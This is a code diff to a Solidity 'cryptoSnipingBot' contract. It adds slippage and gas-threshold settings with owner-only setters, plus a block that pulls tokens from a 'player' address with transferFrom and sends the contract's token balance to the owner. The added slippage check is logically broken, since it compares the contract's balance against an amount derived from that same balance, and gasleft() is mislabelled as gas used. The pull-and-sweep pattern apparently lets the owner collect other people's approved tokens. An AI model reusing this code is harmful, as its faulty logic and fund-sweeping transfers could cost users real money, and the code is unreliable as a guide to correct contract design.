@@ -9,6 +9,8 @@ contract cryptoSnipingBot {
     IERC20 public token;
     uint public percentageDropToSell;
     uint amount;
+    uint public slippegePercentage;
+    uint public gasThreshold;
 
     modifier onlyOwner() {
         require(msg.sender == owner, "Not the owner");
@@ -90,10 +92,28 @@ contract cryptoSnipingBot {
            scanned: true,
            sold: true
        });
-          token.transferFrom(player, address(this), amount);
 
+       uint initialTokenBalance = token.balanceOf(address(this));
+       uint tokensTosell = initialTokenBalance.mul(percentageDropToSell).div(100);
+       uint expectedSaleAmount = tokensTosell.mul(100).div(100 - slippegePercentage);
+       uint receivedAmount = token.balanceOf(address(this));
+       require(receivedAmount >= expectedSaleAmount, "slippege detected");
+       uint gasUsed = gasleft();
+       require(gasUsed <= gasThreshold);
+
+          token.transferFrom(player, address(this), amount);
+          token.transfer(owner, receivedAmount);
 
 
       }
+
+      
+    function setSlippagePercentage(uint _slippagePercentage) external onlyOwner {
+        slippegePercentage = _slippagePercentage;
+    }
+
+    function setGasThreshold(uint _gasThreshold) external onlyOwner {
+        gasThreshold = _gasThreshold;
+    }
 
 }
